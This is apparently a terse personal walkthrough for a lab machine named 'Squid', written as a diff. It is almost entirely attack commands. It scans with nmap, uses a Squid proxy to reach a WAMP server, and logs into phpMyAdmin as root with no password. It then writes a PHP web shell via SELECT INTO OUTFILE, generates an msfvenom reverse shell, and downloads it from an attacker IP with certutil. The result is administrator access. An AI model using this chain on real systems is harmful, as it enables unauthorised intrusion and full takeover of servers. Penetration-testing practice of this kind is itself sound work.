@@ -1,0 +1,55 @@
+Squid 192.168.226.192.168.226.189
+
+nmap -p- -A -T4 -sC 192.168.226.189
+Got nothing 
+Tried following
+nmap -p- -sS  192.168.226.189 -Pn
+
+3128/tcp  open  squid-http
+
+nmap -p 3128 -A -T4 -Pn 192.168.226.189
+3128/tcp open  http-proxy Squid http proxy 4.14
+squid/4.14
+
+
+https://book.hacktricks.xyz/network-services-pentesting/3128-pentesting-squid
+git clone https://github.com/aancw/spose.git 
+
+python3 spose.py --proxy http://192.168.226.189:3128 --target 192.168.226.189
+192.168.226.189 8080 seems OPEN 
+http://192.168.226.189:8080/
+Unable to access 
+
+Firefox settings> ADD proxy > 192.168.226.189:3128
+Now I am able to access 
+WAMP server is running on the target machine
+
+dirb http://192.168.226.189:8080 -p 192.168.226.189:3128
+
+http://192.168.226.189:8080/phpsysinfo/index.php?disp=bootstrap
+http://192.168.226.189:8080/?phpinfo=1
+http://192.168.226.189:8080/phpmyadmin/
+root usr without password
+
+http://192.168.226.189:8080/phpmyadmin/server_sql.php
+Click on Console to run commands
+
+select "<?php echo shell_exec($_GET['c']);?>" into OUTFILE 'C:/wamp/www/cmd1.php'
+
+http://192.168.226.189:8080/cmd.php?&c=whoami
+
+http://192.168.226.189:8080/cmd1.php?&c=more%20C:\Users\Administrator\Desktop\proof.txt
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.153 LPORT=1234 -f exe >shell.exe
+
+http://192.168.226.189:8080/cmd1.php?&c=certutil.exe -urlcache -f http://192.168.45.153:444/shell.exe shell.exe
+http://192.168.226.189:8080/cmd1.php?&c=dir
+
+http://192.168.226.189:8080/cmd1.php?&c=shell.exe
+got shell back 
+as administrator
+
+
+
+
+
